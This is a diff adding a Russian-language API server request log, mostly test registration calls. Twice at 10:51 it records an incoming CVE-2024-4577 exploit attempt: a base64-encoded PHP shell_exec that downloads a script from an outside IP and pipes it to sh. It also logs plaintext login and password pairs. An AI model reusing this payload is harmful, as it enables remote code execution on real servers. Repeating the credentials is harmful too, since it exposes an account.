@@ -1,0 +1,175 @@
+25.08.25 08:14:31 22920066119488: Сервер запущен 0.0.0.0: 20008
+25.08.25 10:25:52 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:25:52 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 10:25:52 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 10:33:13 22920033187392: Запрос:
+	Address: 91.244.74.74
+	Query: { "login": "www-bolotina", "pass": "6K4q_gH", "secret": "secret" }
+	Authorization: empty
+25.08.25 10:33:13 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 10:33:13 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 10:47:38 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:47:38 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 10:47:38 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 10:51:16 22920033187392: Запрос:
+	Address: 119.8.169.21
+	Query: <?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
+	Authorization: empty
+25.08.25 10:51:16 22920033187392: Expecting value: line 1 column 1 (char 0)
+25.08.25 10:51:16 22920033187392: Запрос:
+	Address: 119.8.169.21
+	Query: <?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
+	Authorization: empty
+25.08.25 10:51:16 22920033187392: Expecting value: line 1 column 1 (char 0)
+25.08.25 10:52:58 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:52:58 22920033187392: URL: /api/v2_1/sc/proc_register
+25.08.25 10:52:58 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
+25.08.25 10:53:23 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:53:23 22920033187392: URL: /api/v2_1/sc/proc_register
+25.08.25 10:53:23 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
+25.08.25 10:53:59 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:53:59 22920033187392: URL: /api/v2_1/sc/proc_register
+25.08.25 10:53:59 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
+25.08.25 10:56:22 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:56:22 22920033187392: URL: /api/v2_1/sc/proc_register
+25.08.25 10:56:22 22920033187392: Из запроса /api/v2_1/sc/proc_register не удалось получить название проекта.
+25.08.25 10:57:23 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:57:23 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 10:57:23 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 10:58:49 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:58:49 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 10:58:49 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 10:59:46 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "testuser",
+  "pass": "1234"
+}
+	Authorization: empty
+25.08.25 10:59:46 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 10:59:46 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 11:00:19 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "www-bolotina",
+  "pass": "6K4q_9gH"
+}
+	Authorization: empty
+25.08.25 11:00:19 22920033187392: URL: /api/v2_1/sc/register
+25.08.25 11:00:19 22920033187392: Из запроса /api/v2_1/sc/register не удалось получить название проекта.
+25.08.25 11:09:58 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "www-bolotina",
+  "pass": "6K4q_9gH"
+}
+	Authorization: empty
+25.08.25 11:10:37 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "www-bolotina",
+  "pass": "6K4q_9gH"
+}
+	Authorization: empty
+25.08.25 11:10:37 22920033187392: URL: /api/v2_1/sc/pingserver
+25.08.25 11:10:37 22920033187392: Из запроса /api/v2_1/sc/pingserver не удалось получить название проекта.
+25.08.25 11:10:49 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "www-bolotina",
+  "pass": "6K4q_9gH"
+}
+	Authorization: empty
+25.08.25 11:11:06 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "www-bolotina",
+  "pass": "6K4q_9gH"
+}
+	Authorization: empty
+25.08.25 11:11:10 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: 
+	Authorization: empty
+25.08.25 11:11:10 22920033187392: Expecting value: line 1 column 1 (char 0)
+25.08.25 11:11:17 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: 
+	Authorization: empty
+25.08.25 11:11:17 22920033187392: Expecting value: line 1 column 1 (char 0)
+25.08.25 11:11:23 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+  "login": "www-bolotina",
+  "pass": "6K4q_9gH"
+}
+	Authorization: empty
+25.08.25 11:11:31 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {
+
+
+}
+	Authorization: empty
+25.08.25 11:11:38 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: 
+	Authorization: empty
+25.08.25 11:11:38 22920033187392: Expecting value: line 1 column 1 (char 0)
+25.08.25 11:11:48 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: 
+	Authorization: empty
+25.08.25 11:11:48 22920033187392: Expecting value: line 1 column 1 (char 0)
+25.08.25 11:11:52 22920033187392: Запрос:
+	Address: 54.86.50.139
+	Query: {}
+	Authorization: empty
